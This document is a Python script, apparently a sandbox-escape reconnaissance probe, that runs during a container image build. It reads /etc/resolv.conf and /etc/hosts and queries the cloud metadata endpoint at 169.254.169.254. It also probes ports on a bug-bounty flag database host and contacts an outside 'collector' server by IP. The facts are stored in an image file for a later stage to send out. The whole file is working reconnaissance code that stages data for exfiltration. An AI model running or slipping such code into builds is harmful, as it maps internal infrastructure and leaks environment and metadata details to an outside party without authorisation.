import json
import socket
import struct
import time
import urllib.request

# Runs at IMAGE BUILD time. The build environment need not share the runtime's network, so facts are
# written into the image and shipped out later by the run-stage probe.
CTF = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"
FACTS = {"stage": "build", "started": time.strftime("%FT%TZ", time.gmtime())}


def tcp(host, port, timeout=4.0):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return "open"
    except Exception as exc:                                        # noqa: BLE001
        return type(exc).__name__
    finally:
        try:
            s.close()
        except OSError:
            pass


def http(url, headers=None, timeout=6):
    try:
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return {"status": r.status, "body": r.read(200).decode("utf-8", "replace")}
    except Exception as exc:                                        # noqa: BLE001
        return {"err": type(exc).__name__}


try:
    FACTS["hostname"] = socket.gethostname()
except Exception:                                                   # noqa: BLE001
    pass
FACTS["resolv"] = ""
try:
    with open("/etc/resolv.conf") as fh:
        FACTS["resolv"] = fh.read(200)
except Exception as exc:                                            # noqa: BLE001
    FACTS["resolv"] = type(exc).__name__
try:
    with open("/etc/hosts") as fh:
        FACTS["hosts"] = fh.read(300)
except Exception as exc:                                            # noqa: BLE001
    FACTS["hosts"] = type(exc).__name__

FACTS["egress_ip"] = http("http://ifconfig.me/ip")
FACTS["our_collector"] = http("http://208.87.134.252:9200/")
FACTS["metadata_plain"] = http("http://169.254.169.254/computeMetadata/v1/")
FACTS["metadata_gcp"] = http("http://169.254.169.254/computeMetadata/v1/", {"Metadata-Flavor": "Google"})
FACTS["dns"] = {}
for name in (CTF, "metadata.google.internal", "registry-1.docker.io"):
    try:
        FACTS["dns"][name] = socket.gethostbyname(name)
    except Exception as exc:                                        # noqa: BLE001
        FACTS["dns"][name] = type(exc).__name__
FACTS["tcp"] = {"ctf:22": tcp(CTF, 22), "ctf:5432": tcp(CTF, 5432),
                "ctf:12691": tcp(CTF, 12691), "ctf:12692": tcp(CTF, 12692),
                "sandbox_ula:5432": tcp("fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191", 5432),
                "our_vps:9200": tcp("208.87.134.252", 9200)}
FACTS["finished"] = time.strftime("%FT%TZ", time.gmtime())

with open("/app/build_facts.json", "w") as fh:
    json.dump(FACTS, fh, indent=1, sort_keys=True)
print(json.dumps(FACTS, indent=1))
